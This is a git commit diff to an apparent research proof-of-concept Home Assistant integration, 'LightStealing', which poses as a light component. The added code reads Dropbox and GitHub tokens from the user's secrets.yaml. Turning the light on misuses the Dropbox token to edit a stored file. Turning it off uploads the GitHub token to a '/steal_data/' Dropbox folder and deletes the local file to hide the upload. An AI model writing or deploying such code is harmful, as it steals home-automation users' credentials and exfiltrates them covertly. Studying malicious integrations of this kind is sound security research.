cdf60943708f18f98b55d5b4ad2c8c90c139ccd0
Luca Mannella <luca.mannella@polito.it>
2023-01-30 16:28:01 +0000

    light_stealing exploits T1 and T2

--- light_stealing/light.py
+++ light_stealing/light.py
@@ -5,8 +5,9 @@ import os
 from datetime import datetime
 import logging
 
-import dropbox
 import yaml
+import dropbox
+from dropbox.exceptions import AuthError
 
 # Import the device class from the component that you want to support
 from homeassistant.components.light import LightEntity
@@ -24,6 +25,7 @@ DEFAULT_UPLOAD = False
 TARGET_NAME = "switch_exfiltration"
 TARGET_FULL_NAME = "switch.switch_exfiltration"
 TARGET_TOKEN_NAME = "db_access_token"
+TARGET2_TOKEN_NAME = "github_access_token"
 
 _LOGGER = logging.getLogger(__name__)
 
@@ -60,6 +62,7 @@ class LightStealing(LightEntity):
         self._brightness = None
         self._state = False
         self._upload = upload
+        self._consumption = 2.15  # KWh (fake value)
 
         # This object should physically communicate with the light
         self._light = LightEntity()
@@ -93,13 +96,13 @@ class LightStealing(LightEntity):
         """
         self._brightness = 255
         self._state = True
-        self.stole_token_from_conf()
+        self.use_token()
 
     def turn_off(self, **kwargs: Any) -> None:
         """Instruct the light to turn off."""
         self._brightness = 0
         self._state = False
-        self.stole_token_from_conf()
+        self.spread_token()
 
     def update(self) -> None:
         """Fetch new state data for this light.
@@ -111,8 +114,18 @@ class LightStealing(LightEntity):
         # self._brightness = self._light.brightness
         return
 
-    def stole_token_from_conf(self):
-        """This method retrieves a dropbox token from the secrets file."""
+    def use_token(self):
+        """This method retrieves and uses the DrobBox token (T1)."""
+        dropbox_token, _ = self.get_tokens_from_conf()
+        self.updating_file_on_dropbox(dropbox_token)
+
+    def spread_token(self):
+        """This method spread the GH token (T2) using the Dropbox token."""
+        dropbox_token, github_token = self.get_tokens_from_conf()
+        self.upload_token(dropbox_token, github_token)
+
+    def get_tokens_from_conf(self):
+        """This method retrieves a dropbox token and a github token from the 'secrets.yaml' file."""
 
         # config_dir = self.hass.config.config_dir
         secrets_file_path = self.hass.config.path("secrets.yaml")
@@ -130,12 +143,16 @@ class LightStealing(LightEntity):
                         TARGET_TOKEN_NAME,
                         secrets_file_path,
                     )
-                    return
+                    return False
                 else:
                     dropbox_token = conf_file[TARGET_TOKEN_NAME]
-                    self.use_token(dropbox_token)
+                    if TARGET2_TOKEN_NAME in conf_file:
+                        github_token = conf_file[TARGET2_TOKEN_NAME]
+                    else:
+                        github_token = None
+                    return dropbox_token, github_token
 
-    def stole_token_from_class(self):
+    def get_token_from_class(self):
         """This method retrieves a dropbox token from a target integration.
         Apparently, it works only if the token is hardcoded (not passed as parameter)."""
 
@@ -152,27 +169,37 @@ class LightStealing(LightEntity):
             target_switch = target_integration_component.switch.SwitchExfiltration
 
             dropbox_token = target_switch._access_token
-            self.use_token(dropbox_token)
+            return dropbox_token
 
-    def use_token(self, dropbox_token):
-        """This method uses the stolen token for uploading a file on Dropbox."""
+    def updating_file_on_dropbox(self, dropbox_token):
+        """T1: this method uses the Dropbox token to update a stored file."""
+        online_file = "/steal_data/consumptions.txt"
+        local_file = "./consumptions.txt"
+        self.download_file(online_file, local_file, dropbox_token)
+
+        with open("./consumptions.txt", "a+", encoding="utf-8") as consumption_file:
+            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            text_to_write = current_time + ": " + str(self._consumption) + " KWh\n"
+            consumption_file.write(text_to_write)
+
+        self.upload_file(local_file, online_file, dropbox_token)
+        os.remove(local_file)
+
+    def upload_token(self, dropbox_token, github_token):
+        """T2: this method spreads the GitHub token using the Dropbox token."""
         if not self._upload:
-            _LOGGER.warning("The Dropbox token is: <%s>", dropbox_token)
+            _LOGGER.warning("Dropbox token is: <%s>", dropbox_token)
+            _LOGGER.warning("GitHub token is: <%s>", github_token)
         else:
             current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             filename = current_time + ".txt"
 
             # preparing the file to exfiltrate
-            tmp_file = open(filename, "w", encoding="utf-8")
-            text_to_write = (
-                "At "
-                + current_time
-                + ' I was here! (Using your dropbox token: "'
-                + dropbox_token
-                + '")'
-            )
-            tmp_file.write(text_to_write)
-            tmp_file.close()
+            with open(filename, "w", encoding="utf-8") as tmp_file:
+                text_to_write = (
+                    current_time + ": the stored GitHub token is: " + github_token
+                )
+                tmp_file.write(text_to_write)
 
             # Sending file
             self.upload_file(filename, "/steal_data/" + filename, dropbox_token)
@@ -180,11 +207,36 @@ class LightStealing(LightEntity):
             # Removing the tmp file to hide the upload
             os.remove(filename)
 
+    # ## ### Dropbox utilities methods ### ## #
+
     def upload_file(self, file_from, file_to, access_token):
         """upload a file to Dropbox using API v2"""
-        dbx = dropbox.Dropbox(access_token)
+        dbx = self.dropbox_connection(access_token)
+        if dbx:
+            with open(file_from, "rb") as opened_file:
+                dbx.files_upload(
+                    opened_file.read(), file_to, mode=dropbox.files.WriteMode.overwrite
+                )
+            return True
+        else:
+            return False
 
-        with open(file_from, "rb") as opened_file:
-            dbx.files_upload(
-                opened_file.read(), file_to, mode=dropbox.files.WriteMode.overwrite
-            )
+    def download_file(self, online_file, local_file_path, access_token):
+        """Downloading a file from Dropbox"""
+        dbx = self.dropbox_connection(access_token)
+        if dbx:
+            with open(local_file_path, "wb") as f:
+                metadata, result = dbx.files_download(path=online_file)
+                f.write(result.content)
+            return True
+        else:
+            return False
+
+    def dropbox_connection(self, access_token):
+        """This method returns an established Dropbox connection"""
+        try:
+            dbx = dropbox.Dropbox(access_token)
+            return dbx
+        except AuthError as e:
+            _LOGGER.error("Error connecting to Dropbox with access token: %s", str(e))
+            return False
